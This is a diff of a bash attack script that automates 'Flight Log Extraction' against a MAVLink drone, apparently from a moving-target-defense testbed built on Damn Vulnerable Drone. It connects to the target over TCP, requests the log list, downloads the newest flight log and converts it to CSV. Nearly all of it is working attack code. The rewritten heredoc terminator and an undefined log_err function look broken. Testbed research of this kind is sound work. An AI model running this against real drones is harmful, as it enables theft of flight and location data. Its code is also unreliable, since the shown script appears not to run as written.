@@ -1,136 +1,171 @@
 #!/usr/bin/env bash
+set -euo pipefail
 
-# --- Process Command Line Arguments ---
-# Example: Assign first arg to INTENSITY, default 'medium'
-# INTENSITY="${1:-medium}"
-# Example: Assign second arg to DURATION_SECONDS, default '30'
-# DURATION_SECONDS="${2:-30}"
-# echo "Parameters: Intensity=$INTENSITY, Duration=$DURATION_SECONDS"
-# Add more parameter processing as needed for the specific script
-# ------------------------------------
+# Attack: Flight Log Extraction (MAVLink Log Download & Conversion, MTD-aware)
+# Target Service: DRONE_MAVLINK_TCP (Default Port 5760 assumed for reliable log transfer)
 
-# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Flight-Log-Extraction.md
-# Created: 2025-09-14 13:46:03
-# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
-
-# MTD_INTERFACE_START
-# =======================================================================
-# MTD-aware Target Acquisition (from Orchestrator Environment)
-# =======================================================================
-# 이 스크립트는 attack_orchestrator.py에 의해 TARGET_IP와 TARGET_PORT 환경 변수가
-# 설정될 것을 기대하고 실행됩니다.
-
+# --- MTD_INTERFACE_START (Mandatory dynamic target acquisition) ---
+# Orchestrator가 TARGET_IP, TARGET_PORT, TARGET_SERVICE를 주입해야 합니다.
 if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
     echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
-    echo "This script must be run via the attack_orchestrator.py" >&2
+    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
     exit 1
 fi
 
-echo "[INFO] Attack target acquired from orchestrator: ${TARGET_IP}:${TARGET_PORT}"
-# MTD_INTERFACE_END
+# 서비스 타입별 기본 포트 설정 (MAVLink TCP를 기본으로 가정)
+case "${TARGET_SERVICE:-DRONE_MAVLINK_TCP}" in
+    DRONE_MAVLINK_TCP)
+        TARGET_PORT="${TARGET_PORT:-5760}"
+        ;;
+    DRONE_MAVLINK)
+        TARGET_PORT="${TARGET_PORT:-14550}"
+        ;;
+    *)
+        : # 다른 서비스는 Orchestrator가 포트 값을 넣어준다고 가정
+        ;;
+esac
 
-set -euo pipefail
+echo "[INFO] Target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-DRONE_MAVLINK_TCP})"
+# --- MTD_INTERFACE_END ---
 
-# 기준 경로 (요구사항)
+# --- Common Log/BASE Setup ---
 export BASE="${BASE:-$PWD}"
-
-# 공통 로그 연결(선택사항) - 존재 시 로드
-if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
-  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
-  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
+if [[ -f "$BASE/00_env.sh" ]]; then
+    . "$BASE/00_env.sh"
+else
+    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"
+    mkdir -p "$(dirname "$DVD_LOG")"
+    log(){ echo "[$(date +%F_%T)] $*"; }
+    export -f log
 fi
 
 log "[ATTACK] id=flight-log-extraction src=Flight-Log-Extraction.md"
-log "[BLOCK 1] type=shell"
-mavproxy.py --master=udp:${TARGET_IP}:${TARGET_PORT}
 
-log "[BLOCK 2] type=shell"
-log list
-log download <log_index>
+log "[BLOCK 1] type=python (Automated Latest Log Download)"
 
-log "[BLOCK 3] type=python"
-python3 - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
-# --- argv glue for converter ---
-import os, sys, re
-if len(sys.argv) <= 1:
-    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:${TARGET_IP}:14550')
-    if ep.startswith('udp:'):
-        try:
-            _, rest = ep.split(':', 1)
-            ep = rest
-        except ValueError:
-            pass
-    # expect ip:port
-    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
-        sys.argv = [sys.argv[0], ep]
+# Python 스크립트를 실행하여 최신 로그를 다운로드하고, 파일 경로를 쉘 변수로 캡처합니다.
+# 다운로드 과정을 표준 출력 대신 표준 오류로 보내고, 최종 파일 경로만 표준 출력으로 내보냅니다.
+DOWNLOADED_LOG_FILE=$(sudo python3 -u - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
 import sys
+import time
 from pymavlink import mavutil
 
-def list_logs(connection):
-    connection.mav.log_request_list_send(
-        connection.target_system, 
-        connection.target_component, 
-        0, 0xffff
-    )
+# --- Dynamic Target Acquisition ---
+if len(sys.argv) != 2:
+    sys.exit(1)
+    
+target_ip, target_port_str = sys.argv[1].split(':', 1)
+try:
+    target_port = int(target_port_str)
+except ValueError:
+    print(f"[ERROR] Invalid port: {target_port_str}", file=sys.stderr)
+    sys.exit(1)
+# ----------------------------------
 
-    logs = []
-    while True:
-        msg = connection.recv_match(type=['LOG_ENTRY'], blocking=True, timeout=5)
-        if msg is None:
+def download_latest_log(connection):
+    print("[INFO] Requesting log list...", file=sys.stderr)
+    # 로그 리스트 요청 (ID 0부터 0xffff까지)
+    connection.mav.log_request_list_send(connection.target_system, connection.target_component, 0, 0xffff)
+    
+    latest_log = None
+    timeout = time.time() + 10 # 10초 타임아웃 설정
+    
+    # 1. 최신 로그 (가장 큰 ID) 찾기
+    while time.time() < timeout:
+        msg = connection.recv_match(type=['LOG_ENTRY'], blocking=True, timeout=0.1)
+        if msg:
+            if latest_log is None or msg.id > latest_log.id:
+                latest_log = msg
+        elif latest_log is not None:
+            # 첫 번째 LOG_ENTRY를 받은 후 잠시 메시지가 없으면 목록 수신 완료로 간주
             break
-        logs.append(msg)
-    return logs
+            
+    if latest_log is None:
+        return None
 
-def download_log(connection, log_id, log_size, filename):
+    log_id = latest_log.id
+    log_size = latest_log.size
+    filename = f"log_extracted_{log_id}.bin"
+
+    print(f"[INFO] Latest Log ID: {log_id}, Size: {log_size} bytes. Starting download to {filename}", file=sys.stderr)
+
+    # 2. 로그 블록 다운로드
     with open(filename, 'wb') as file:
         bytes_received = 0
         ofs = 0
+        BLOCK_SIZE = 90
+        
         while bytes_received < log_size:
+            # 데이터 요청
             connection.mav.log_request_data_send(
                 connection.target_system,
                 connection.target_component,
                 log_id,
                 ofs,
-                90
+                min(log_size - bytes_received, BLOCK_SIZE)
             )
-            while True:
-                msg = connection.recv_match(type=['LOG_DATA'], blocking=True, timeout=5)
+            
+            # LOG_DATA 응답 대기
+            timeout_data = time.time() + 5
+            received_block = False
+            while time.time() < timeout_data:
+                msg = connection.recv_match(type=['LOG_DATA'], blocking=True, timeout=0.1)
+                
                 if msg is None:
-                    break
-                if msg.id != log_id or msg.ofs != ofs:
                     continue
-                data = bytes(msg.data)
-                file.write(data)
-                bytes_received += len(data)
-                ofs += len(data)
-                print(f"Received {bytes_received}/{log_size} bytes")
-                break
+                
+                if msg.id == log_id and msg.ofs == ofs:
+                    data = bytes(msg.data[:msg.count])
+                    file.write(data)
+                    bytes_received += len(data)
+                    ofs += len(data)
+                    
+                    sys.stderr.write(f"[STATUS] Received {bytes_received}/{log_size} bytes ({100 * bytes_received / log_size:.2f}%)   \r")
+                    sys.stderr.flush()
+                    received_block = True
+                    break
+            
+            if not received_block:
+                print(f"\n[WARNING] Timeout receiving LOG_DATA at offset {ofs}. Retrying...", file=sys.stderr)
+                time.sleep(1)
+
+    print(f"\n[SUCCESS] Log {log_id} downloaded completely.", file=sys.stderr)
+    return filename
 
 if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("Usage: python log-extract.py <connection_string> <log_id>")
+    try:
+        connection = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
+        connection.wait_heartbeat(timeout=10)
+        
+        downloaded_file = download_latest_log(connection)
+        
+        if downloaded_file:
+            # 쉘에서 캡처할 수 있도록 명확한 형식으로 파일 경로 출력
+            print(f"DOWNLOAD_FILE_PATH:{downloaded_file}")
+
+    except Exception as e:
+        print(f"[CRITICAL ERROR] Execution failed: {e}", file=sys.stderr)
         sys.exit(1)
+'PY' 2> >(log_err) ) # Python의 stderr(로그)를 bash log 함수로 리디렉션
 
-    connection_string = sys.argv[1]
-    log_id = int(sys.argv[2])
+# Python 스크립트의 표준 출력에서 파일 이름을 추출 (다운로드 파일 경로)
+DOWNLOADED_FILENAME=$(echo "${DOWNLOADED_LOG_FILE}" | grep "DOWNLOAD_FILE_PATH" | cut -d ':' -f 2)
 
-    connection = mavutil.mavlink_connection(connection_string)
-    connection.wait_heartbeat()
+if [[ -z "${DOWNLOADED_FILENAME}" ]]; then
+    log "[ERROR] Failed to download any flight log file. Aborting CSV conversion."
+    exit 1
+fi
 
-    logs = list_logs(connection)
-    for log in logs:
-        print(f"Log ID: {log.id}, Size: {log.size}, Time: {log.time_utc}")
+log "[BLOCK 2] type=shell (Convert Downloaded Log to CSV)"
 
-    log_to_download = next((log for log in logs if log.id == log_id), None)
-    if log_to_download:
-        download_log(connection, log_to_download.id, log_to_download.size, f"log_{log_id}.bin")
-        print(f"Log {log_id} downloaded successfully.")
-    else:
-        print(f"Log ID {log_id} not found.")
-PY
+CSV_OUTPUT_DIR="logs_csv_$(date +%Y%m%d_%H%M%S)"
+mkdir -p "${CSV_OUTPUT_DIR}"
 
-log "[BLOCK 4] type=shell"
-python log-extract.py tcp:${TARGET_IP}:5760 1
+log "Converting ${DOWNLOADED_FILENAME} to CSV in ${CSV_OUTPUT_DIR}..."
 
-log "[BLOCK 5] type=shell"
-bin2csv -o logs_csv log_1.bin
+# mavlogdump.py 또는 bin2csv를 사용하여 변환 수행
+# sudo bin2csv -o logs_csv log_1.bin (원본 스크립트 기반)
+sudo bin2csv -o "${CSV_OUTPUT_DIR}" "${DOWNLOADED_FILENAME}"
+
+log "[BLOCK 3] type=control (Extraction and Conversion Completed)"
+log "Flight log data successfully extracted, converted, and stored in the ${CSV_OUTPUT_DIR} directory."
